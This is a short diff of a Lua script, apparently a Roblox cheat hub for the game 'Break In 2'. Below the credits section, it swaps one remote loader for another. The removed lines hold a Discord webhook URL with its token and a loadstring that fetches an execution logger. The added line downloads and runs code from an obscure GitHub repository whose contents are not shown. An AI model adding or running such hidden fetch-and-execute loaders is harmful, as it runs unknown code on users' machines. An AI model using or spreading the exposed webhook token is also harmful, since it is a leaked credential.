@@ -188,9 +188,7 @@ Tab5:Label("Credits To Gb")
 
 Tab5:Line()
 
-getgenv().whscript = "Harlen Hub | Break In 2( Home )"         --Change to the name of your script
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1232218623888592906/1tElv-oWWzP8E-23W2Z5loqR4B_NeQAxt0rFoehVfmSGw7SHx5wtZSLaNM44teAIaYre"  --Put your Webhook Url here
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/venoxhh/robloxuniversal/main/webhook_execution")))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Fe800Vdoa/23WBHK917392826937281/main/23BI2(H0M3)-ADM9868669678528")))()
 
 --[[
 ]]
